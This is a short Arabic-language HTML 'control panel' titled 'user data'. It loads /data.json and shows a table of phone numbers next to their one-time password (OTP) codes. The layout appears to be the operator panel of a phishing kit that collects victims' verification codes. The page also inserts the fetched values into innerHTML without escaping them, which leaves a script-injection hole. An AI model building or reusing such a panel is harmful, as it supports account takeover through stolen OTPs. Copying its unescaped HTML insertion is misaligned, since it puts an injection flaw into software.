<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>لوحة التحكم</title>
<style>
body {
  font-family: Arial, sans-serif;
  background-color: #f0f2f5;
}
table {
  width: 80%;
  margin: 20px auto;
  border-collapse: collapse;
  background: white;
}
table, th, td {
  border: 1px solid #ccc;
}
th, td {
  padding: 10px;
  text-align: center;
}
</style>
</head>
<body>

<h2 style="text-align:center">بيانات المستخدمين</h2>

<table id="data-table">
  <thead>
    <tr>
      <th>رقم الهاتف</th>
      <th>OTP</th>
    </tr>
  </thead>
  <tbody>
  </tbody>
</table>

<script>
fetch('/data.json')
  .then(res => res.json())
  .then(data => {
    const tbody = document.querySelector('#data-table tbody');
    data.forEach(row => {
      const tr = document.createElement('tr');
      tr.innerHTML = `<td>${row.phone}</td><td>${row.otp}</td>`;
      tbody.appendChild(tr);
    });
  });
</script>

</body>
</html>
